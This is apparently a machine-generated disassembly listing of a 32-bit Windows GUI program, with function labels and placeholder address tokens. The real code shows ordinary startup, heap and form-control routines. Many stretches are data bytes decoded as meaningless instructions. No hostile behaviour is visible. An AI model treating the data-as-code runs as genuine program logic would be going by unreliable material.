sub_4012da
dec esp
add [ eax ] al
add ecx [ eax - 0xc ]
dec esp
add [ eax ] al
add al ah
dec [ eax + eax ]
push ds
in al 0xbe
inc esp
add [ eax ] al
push ds
add al 0x17
inc eax
add [ eax ] al
push ds
mov [ ebx ] ch
inc ebx
add [ eax ] al
push ds
adc bh dl
inc ebx
add [ eax ] al
push ds
add [ eax ] ch
inc ebx
add [ eax ] al
push ds
adc ch 0x41
add [ eax ] al
push ds
push esp
adc [ ebx ] eax
add [ esi ] bl
ror [ edx ] 0x43
add [ eax ] al
push ds
adc dl dh
inc ecx
add [ eax ] al
push ds
lodsb [ esi ]
rol [ ebx ] 0x1
add [ esi ] bl
xchg esp eax
rol [ ecx ] 0x1
add [ esi ] bl
and al 0xf1
inc ecx
add [ eax ] al
push ds
je r-xdata
inc ecx
add [ eax ] al
push ds
aam 0xde
inc ebx
add [ eax ] al
push ds
hlt
sub_4014ce
mov eax [ rw-data ]
shl eax 0x2
mov [ rw-data ] eax
push edx
push 0x0
call GetModuleHandleA
mov edx eax
call sub_4c4760
pop edx
call sub_4c437c
call sub_4c4c4c
push 0x0
call sub_4c5d58
pop ecx
push rw-data
push 0x0
call GetModuleHandleA
mov [ rw-data ] eax
push 0x0
jmp r-xdata
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x10 ]
and eax 0x1
mov [ rw-data ] eax
call sub_4ccc88
mov edx [ esi + 0x20 ]
push edx
mov ecx [ esi + 0x1c ]
push ecx
call sub_4cd144
add esp 0x8
mov eax [ esi + 0x28 ]
push eax
call sub_4c6a24
pop ecx
mov edx [ esi + 0x44 ]
push edx
call sub_4c6a34
pop ecx
mov [ rw-data ] 0x1
mov [ rw-data ] esi
lea ecx [ ebp - 0x8 ]
mov [ rw-data ] ecx
call sub_4c5f70
call GetEnvironmentStrings
mov [ rw-data ] eax
call GetCommandLineA
mov [ rw-data ] eax
mov eax [ esi + 0x30 ]
push eax
mov edx [ esi + 0x2c ]
push edx
call sub_4cedf8
add esp 0x8
mov ecx [ esi + 0x40 ]
push ecx
mov eax [ esi + 0x3c ]
push eax
mov edx [ esi + 0x38 ]
push edx
mov ecx [ esi + 0x34 ]
push ecx
call sub_4cee3c
add esp 0x10
call sub_4cf998
mov edi eax
test eax eax
je r-xdata
push 0x0
push rw-data
call sub_4cf9a0
add esp 0x8
test [ esi + 0x10 ] 0x1
je r-xdata
mov edx [ edi ]
mov [ edi + edx * 4 + 0x4 ] 0xffffffff
push 0x0
push edi
call sub_4cf9a0
add esp 0x8
xor ecx ecx
mov [ ebp - 0xc ] ecx
lea ebx [ edi + 0x4 ]
jmp r-xdata
mov edx [ rw-data ]
push edx
mov ecx [ rw-data ]
push ecx
mov eax [ rw-data ]
push eax
call [ esi + 0x18 ]
add esp 0xc
push eax
call sub_4ceda8
pop ecx
mov ebx [ rw-data ]
jmp r-xdata
mov ecx [ edi ]
cmp ecx [ ebp - 0xc ]
jg r-xdata
mov al [ ebx ]
cmp al 0x20
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
push edx
push 0x0
call [ eax + 0x18 ]
add esp 0x8
inc [ ebp - 0xc ]
add ebx 0x4
inc ebx
cmp al 0x9
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
mov dl 0x20
jmp r-xdata
mov dl 0x22
inc ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp dl al
je r-xdata
mov al [ ebx ]
test al al
je r-xdata
inc ebx
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp al 0x9
je r-xdata
cmp al 0x20
je r-xdata
inc ebx
inc ebx
call sub_4cfc98
push eax
push ebx
push 0x0
push 0x0
call GetModuleHandleA
push eax
call [ esi + 0x18 ]
add esp 0x10
push eax
call sub_4ceda8
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40158c
mov ecx 0xec
or ecx ecx
je r-xdata
retn
call sub_4cfd20
mov [ rw-data ] eax
cmp eax 0x0
jae r-xdata
mov ecx 0xec
or ecx ecx
je r-xdata
mov eax 0xfc
call sub_401528
retn
cmp [ rw-data ] 0x0
jae r-xdata
mov ecx 0xec
push ecx
push 0x8
call GetProcessHeap
push eax
call HeapAlloc
or eax eax
jne r-xdata
mov eax 0xfe
call sub_401528
push eax
push eax
push [ rw-data ]
call sub_4cfd48
push [ rw-data ]
call sub_4cfd5c
pop edi
mov eax 0xfd
call sub_401528
sub_4015af
cmp [ rw-data ] 0x0
jb r-xdata
retn
push [ rw-data ]
call sub_4cfd38
or eax eax
je r-xdata
push eax
push 0x8
call GetProcessHeap
push eax
call HeapFree
push [ rw-data ]
call sub_4cfd64
sub_40163c
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ rw-data ] al
mov [ rw-data ] dl
test al al
je r-xdata
xor eax eax
jmp r-xdata
test dl dl
je r-xdata
mov edx [ rw-data ]
mov [ edx ] al
mov [ rw-data ] ecx
mov [ rw-data ] ecx
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
call sub_40160c
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
mov eax sub_40163c
call sub_44b16c
mov [ rw-data ] eax
mov eax rw-data
call sub_44b16c
mov [ rw-data ] eax
call GetCommandLineW
mov edx [ rw-data ]
mov [ edx ] eax
movzx eax [ ebp + 0x14 ]
xor al 0x1
mov edx [ rw-data ]
mov [ edx ] al
sub_4016d4
push ebx
push esi
mov esi [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
call sub_401618
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
mov ebx eax
xor eax eax
mov [ esi ] eax
call ebx
cmp [ esi ] 0x0
jne r-xdata
sub_401704
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_401729
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401730
retn
sub_40173c
push ebp
mov ebp esp
add esp 0xffffffc4
test dl dl
push ebx
push esi
mov [ ebp - 0x1c ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x2c ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0x20 ] 0x11
mov [ ebp - 0x2c ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x20 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x380 ]
call sub_48dfa0
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x2c ] 0x24
mov edx rw-data
lea eax [ ebp - 0x10 ]
call sub_4d3010
inc [ ebp - 0x20 ]
lea ecx [ ebp - 0x10 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x20 ]
xor ecx ecx
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x14 ]
inc [ ebp - 0x20 ]
pop edx
call sub_4d31c8
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38c ]
mov edx [ edx ]
call sub_48dfa0
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x20 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x2c ] 0x30
mov edx rw-data
lea eax [ ebp - 0x18 ]
call sub_4d3010
mov edx eax
inc [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38c ]
add eax 0x80
call sub_4d31b4
dec [ ebp - 0x20 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x4 ]
push ecx
call sub_401950
pop ecx
mov eax [ ebp - 0x3c ]
mov [ fs : 0x0 ] eax
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_40188c
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4785a4
add [ ebp - 0xc ] 0x10
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_401950
push ebp
mov ebp esp
add esp 0xffffffb4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov eax [ rw-data ]
mov edi rw-data
mov esi rw-data
mov dl [ eax + 0xc ]
test dl dl
je r-xdata
mov [ ebp - 0x3c ] 0x30
mov edx rw-data
lea eax [ ebp - 0x1c ]
call sub_4d3010
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x1c ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x18 ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor ecx ecx
mov [ ebp - 0x20 ] ecx
lea ecx [ ebp - 0x20 ]
inc [ ebp - 0x30 ]
pop edx
call sub_4d31c8
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x388 ]
mov edx [ edx ]
call sub_48dfa0
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x3c ] 0x3c
mov edx rw-data
lea eax [ ebp - 0x24 ]
call sub_4d3010
mov edx eax
inc [ ebp - 0x30 ]
mov eax [ ebx + 0x388 ]
add eax 0x80
call sub_4d31b4
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x3c ] 0x48
lea eax [ ebp - 0x28 ]
mov edx esi
call sub_4d3128
inc [ ebp - 0x30 ]
mov edx [ eax ]
mov eax [ ebx + 0x394 ]
call sub_48dfa0
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x394 ]
mov edx 0xff
mov eax [ ecx + 0x64 ]
call sub_46d5ac
mov [ ebp - 0x3c ] 0xc
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x30 ]
lea ecx [ ebp - 0x8 ]
push ecx
mov edx rw-data
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x30 ]
xor ecx ecx
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x30 ]
pop edx
call sub_4d31c8
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x388 ]
mov edx [ edx ]
call sub_48dfa0
dec [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x3c ] 0x18
mov edx rw-data
lea eax [ ebp - 0x10 ]
call sub_4d3010
mov edx eax
inc [ ebp - 0x30 ]
mov eax [ ebx + 0x388 ]
add eax 0x80
call sub_4d31b4
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x3c ] 0x24
lea eax [ ebp - 0x14 ]
mov edx edi
call sub_4d3128
inc [ ebp - 0x30 ]
mov edx [ eax ]
mov eax [ ebx + 0x394 ]
call sub_48dfa0
dec [ ebp - 0x30 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x394 ]
mov edx 0x800000
mov eax [ ecx + 0x64 ]
call sub_46d5ac
jmp r-xdata
mov ecx [ rw-data ]
xor edx edx
mov eax [ ebx + 0x39c ]
mov dl [ ecx + 0xc ]
cmp edx 0x1
sbb edx edx
mov ecx [ eax ]
neg edx
call [ ecx + 0x64 ]
mov eax [ rw-data ]
xor edx edx
mov dl [ eax + 0xc ]
mov eax [ ebx + 0x398 ]
cmp edx 0x1
sbb edx edx
mov ecx [ eax ]
neg edx
call [ ecx + 0x64 ]
mov eax [ rw-data ]
xor edx edx
mov dl [ eax + 0xc ]
mov eax [ ebx + 0x3a0 ]
cmp edx 0x1
sbb edx edx
mov ecx [ eax ]
neg edx
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_401bd8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x2c ] edx
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov esi [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
add esi 0x80
xor ecx ecx
mov edx esi
call sub_4d2680
inc [ ebp - 0xc ]
lea ebx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ ebx ]
test eax eax
jne r-xdata
mov edi [ ebx ]
test edi edi
je r-xdata
mov edx rw-data
jmp r-xdata
mov edx [ ebx ]
movzx eax [ edi - 0xa ]
cmp eax 0x2
jne r-xdata
push edx
mov ecx [ rw-data ]
push ecx
call sub_4047d4
add esp 0x8
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call j_sub_44a5d8#2
mov edx ebx
mov eax ebx
call sub_41e5d8
sub_401c7f
inc [ edi ]
add [ eax ] al
add [ eax ] cl
pop eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebp + ebx + 0x30040 ] al
pop esp
add [ ebx + 0x79 ] dl
jae r-xdata
nop
add [ eax + eax ] cl
sub al 0x1d
inc eax
add [ esi + eax * 2 + 0x6f ] dl
insd
cmp bh [ edx ]
inc ecx
outsb
jae r-xdata
loop r-xdata
and [ edx ] ch
add [ eax + 0x3 ] bh
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bh 0x0
add [ eax ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add [ eax ] al
adc [ eax ] eax
add [ eax ] al
inc eax
pop ds
inc eax
add [ ebx ] al
add [ eax + eax + 0x46 ] dl
outsd
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x2c000c00 ] dl
sbb eax 0x46540040
push ebx
je r-xdata
nop
add al 0x0
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
or al 0x0
add [ eax ] al
add [ ebx ] al
add [ eax ] dh
add bh bh
jae r-xdata
outsd
inc esi
imul ebp [ esi + 0x67 ] 0x3e303c54
add [ eax ] al
int3
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4d2728
test esi 0x1
je r-xdata
je r-xdata
cmp dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
push ebx
call sub_4b0180
pop ecx
test ebx ebx
add [ eax ] al
add [ eax ] al
cwde
pop ds
inc eax
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax rw-data
call sub_4c517c
sub_401ee0
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx [ ebp + 0x8 ]
mov ecx esi
push edx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_478900
add [ ebp - 0xc ] 0x10
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4d36a9
sub_401f40
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
call sub_4d36b1
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0xc ] 0x10
test bl bl
jl r-xdata
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
test bl bl
jle r-xdata
mov [ ebp - 0x18 ] 0xc
sub [ ebp - 0xc ] 0x10
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4789b0
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4d36a4
sub_402157
inc [ ebx ]
add [ eax ] al
add [ eax ] bl
pop esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x22 ] bh
inc eax
add [ ecx ] al
add [ eax ] ah
push ebx
jns r-xdata
xor ecx ecx
mov [ ebx ] ecx
je r-xdata
pop esi
pop ebx
retn
push ebx
call sub_4b0180
mov eax [ ebx ]
test eax eax
je r-xdata
insd
cmp bh [ edx ]
inc esp
jns r-xdata
test esi 0x1
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
je r-xdata
or esi edi
mov [ ecx ] 0x0
add [ eax ] al
popad
insd
imul esp [ ebx + 0x41 ] 0x79617272
cmp al 0x46
outsd
jb r-xdata
pop ecx
or al [ eax ]
jae r-xdata
pop es
cmp dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] al
mov bh 0x0
add [ eax ] al
dec eax
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
add [ eax ] al
or al [ eax ]
add [ eax ] al
jl r-xdata
jo r-xdata
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
dec ecx
add [ ebx ] al
add [ eax + eax + 0x43 ] bl
outsd
outsb
je r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop ecx
xor eax eax
mov [ ebx ] eax
test [ ebp + 0xc ] 0x1
je r-xdata
inc eax
add al al
add [ eax ] eax
add ah bh
sbb [ eax ] al
enter 0x1 0x0
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
dec [ edx ]
jne r-xdata
outsd
insb
jae r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn
push ebx
call sub_4b0180
pop ecx
push ebx
call sub_4022a0
pop ebp
retn
push eax
call sub_4022bc
pop ecx
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
cmp dl [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
test esi 0x1
je r-xdata
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
xor ecx ecx
mov [ ebx ] ecx
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
outsd
insb
add [ eax ] al
add [ eax ] dl
and eax [ eax ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
push ebx
call sub_4b0180
pop ecx
pop esi
pop ebx
pop ebp
retn
mov ebx eax
push esi
call sub_4022f8
pop ecx
jmp r-xdata
mov edx eax
add eax 0xffffffff
test edx edx
jg r-xdata
test ebx ebx
add ebx 0x8
mov eax [ esi ]
sub eax 0x8
push eax
call sub_4c429c
pop ecx
xor ecx ecx
mov [ esi ] ecx
sub_402208
pushad
add al [ eax ]
add [ ebx ] al
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x48000000 ] dh
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
add [ eax ] al
or al [ eax ]
add [ eax ] al
jl r-xdata
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
dec ecx
add [ ebx ] al
add [ eax + eax + 0x43 ] bl
outsd
outsb
je r-xdata
pop ecx
xor eax eax
mov [ ebx ] eax
test [ ebp + 0xc ] 0x1
je r-xdata
inc eax
add al al
add [ eax ] eax
add ah bh
sbb [ eax ] al
enter 0x1 0x0
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
dec [ edx ]
jne r-xdata
outsd
insb
jae r-xdata
pop ebx
pop ebp
retn
push ebx
call sub_4b0180
pop ecx
push ebx
call sub_4022a0
pop ebp
retn
push eax
call sub_4022bc
pop ecx
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
cmp dl [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
outsd
insb
add [ eax ] al
add [ eax ] dl
and eax [ eax ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
pop esi
pop ebx
pop ebp
retn
mov ebx eax
push esi
call sub_4022f8
pop ecx
jmp r-xdata
mov edx eax
add eax 0xffffffff
test edx edx
jg r-xdata
test ebx ebx
add ebx 0x8
mov eax [ esi ]
sub eax 0x8
push eax
call sub_4c429c
pop ecx
xor ecx ecx
mov [ esi ] ecx
sub_4022a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
test edx edx
je r-xdata
pop ebp
retn
add edx 0xfffffff8
dec [ edx ]
jne r-xdata
push eax
call sub_4022bc
pop ecx
sub_4022bc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov ebx eax
push esi
call sub_4022f8
pop ecx
jmp r-xdata
mov edx eax
add eax 0xffffffff
test edx edx
jg r-xdata
test ebx ebx
add ebx 0x8
mov eax [ esi ]
sub eax 0x8
push eax
call sub_4c429c
pop ecx
xor ecx ecx
mov [ esi ] ecx
sub_402387
inc [ ebx ]
add [ eax ] al
add [ eax ] ah
add [ fs : eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ch
and eax [ eax ]
add eax [ eax ]
push 0x73795300
je r-xdata
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bh 0x0
add [ eax ] al
inc esp
insd
cmp bh [ edx ]
inc esp
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x54 ] al
add [ eax ] al
imul ecx [ ecx + 0x6e ] 0x66726574
popad
arpl [ ebp + 0x3c ] sp
inc ebx
outsd
outsb
je r-xdata
add ah al
loop r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ edi + 0x48000000 ] dh
add [ ebx ] al
add [ eax ] bl
inc ebx
insb
popad
jae r-xdata
add [ edi + eax + 0x53 ] dh
cmp cl [ ecx + 0x44 ]
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
jae r-xdata
add [ eax ] al
add [ eax ] al
fsub [ eax + eax * 2 ]
jae r-xdata
add [ eax + eax ] dl
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ edi + 0x44000000 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x3004481 ] ah
add [ eax ] cl
push ebx
jns r-xdata
inc esp
add [ eax ] al
cmp dl [ eax + edx * 2 + 0x65 ]
jb r-xdata
add [ eax ] al
nop
add [ eax + eax ] cl
mov al [ 0x54004040 ]
inc ecx
jae r-xdata
je r-xdata
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
dec ebp
inc edx
add [ ebx ] al
add [ eax + eax + 0x43 ] bl
insb
popad
jae r-xdata
add [ eax ] al
dec eax
cmp dl [ ebx + eax * 2 + 0x6f ]
insd
jo r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
call sub_4d36a9
jle r-xdata
fadd [ edx + edx * 8 + 0x55885653 ]
clc
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add eax [ eax ]
xor [ eax ] al
add [ eax ] al
add [ eax ] al
mov bl 0x0
add [ eax ] al
inc eax
add [ eax + eax ] al
imul esi [ ebx + 0x74 ] 0x746e65
add [ eax ] al
add al bl
and al 0x40
dec edx
je r-xdata
imul esp [ edi + 0x6e ] 0x6c616944
outsd
and [ bp + si ] ch
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff88
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x60 ] ecx
imul eax [ ebx + 0x470 ] 0x1a90
mov esi [ ebx + 0x474 ]
mov edx [ ebp - 0x60 ]
shl esi 0x2
add eax edx
add eax 0x8
lea esi [ esi + esi * 4 ]
lea esi [ esi + esi * 4 ]
add esi eax
mov eax [ ebx + 0x388 ]
mov eax [ eax + 0x2c4 ]
call sub_4a4e2c
mov [ ebx + 0x478 ] eax
mov edx [ esi ]
sub edx 0x1
jb r-xdata
retn
adc [ 0xffffffff8b5b5e00 ] ecx
in eax 0x5d
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
insd
cmp bh [ edx ]
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
inc eax
outsb
outsb
je r-xdata
test esi 0x1
je r-xdata
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
xor ecx ecx
mov [ ebx ] ecx
mov [ ebx + 0x478 ] 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebx + 0x478 ]
test ecx ecx
jne r-xdata
je r-xdata
js r-xdata
call sub_4b0180
pop ecx
push ebx
mov [ ebx + 0x478 ] 0x4
mov edx [ ebx + 0x478 ]
mov edi [ ebx + 0x388 ]
mov eax edi
call sub_4a5850
mov edx eax
mov eax edi
call sub_4a5a04
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_403db0
mov edx eax
mov eax [ ebx + 0x430 ]
call sub_4a6714
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_403db0
mov edx eax
mov eax [ ebx + 0x444 ]
call sub_4a6714
mov edx [ ebx + 0x430 ]
mov eax ebx
call sub_403b20
mov edx [ ebx + 0x444 ]
mov eax ebx
call sub_403b20
